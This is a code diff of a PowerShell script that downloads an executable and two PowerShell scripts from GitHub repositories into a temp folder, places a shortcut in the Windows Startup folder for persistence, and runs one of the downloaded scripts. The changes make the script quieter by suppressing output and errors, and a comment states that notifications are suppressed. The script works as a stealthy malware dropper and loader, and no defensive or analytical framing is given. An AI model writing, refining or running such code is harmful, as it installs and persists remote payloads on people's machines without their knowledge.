@@ -17,10 +17,8 @@ If (!(Test-Path -Path $tempPath)) {
 try {
     $startupFile = "$tempPath\Startup.exe"
     Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/Startup.exe" `
-        -OutFile $startupFile
-} catch {
-    exit
-}
+        -OutFile $startupFile -ErrorAction Stop | Out-Null
+} catch {}
 
 # Create Shortcut in Startup Folder
 try {
@@ -31,31 +29,25 @@ try {
     $shortcut.WindowStyle = 1
     $shortcut.Description = "Startup Application"
     $shortcut.Save()
-} catch {
-    exit
-}
+} catch {}
 
 # Download runtime.ps1
 try {
     $runtimeFile = "$tempPath\runtime.ps1"
     Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/runtime.ps1" `
-        -OutFile $runtimeFile
-} catch {
-    exit
-}
+        -OutFile $runtimeFile -ErrorAction Stop | Out-Null
+} catch {}
 
 # Download pydata.ps1
 try {
     $pydataFile = "$tempPath\pydata.ps1"
     Invoke-WebRequest -Uri "https://github.com/KevinDark5/Project/raw/refs/heads/main/DLLs/pst.ps1" `
-        -OutFile $pydataFile
-} catch {
-    exit
-}
+        -OutFile $pydataFile -ErrorAction Stop | Out-Null
+} catch {}
 
 # Execute pydata.ps1
 try {
     & $pydataFile
-} catch {
-    exit
-}
+} catch {}
+
+# All notifications and paths are suppressed
